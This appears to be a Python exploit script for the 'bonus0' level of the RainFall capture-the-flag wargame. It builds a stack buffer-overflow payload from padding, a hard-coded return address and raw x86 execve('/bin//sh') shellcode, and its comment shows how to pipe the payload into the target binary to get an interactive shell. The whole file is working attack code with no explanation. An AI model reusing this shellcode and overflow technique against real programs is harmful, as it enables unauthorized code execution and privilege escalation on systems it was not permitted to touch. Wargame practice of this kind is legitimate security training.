#!/usr/bin/env python
'''
output into a file and use 2 cats right meow
---------
bonus0@RainFall:/tmp$ ./bonus0.py > exploit_b0
bonus0@RainFall:/tmp$ (cat exploit_b0 ; cat) | /home/user/bonus0/bonus0
'''
sh = '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'
print('A'*4095)
print('B'*9 + '\xbf\xff\xe6\x8d'[::-1] + sh)
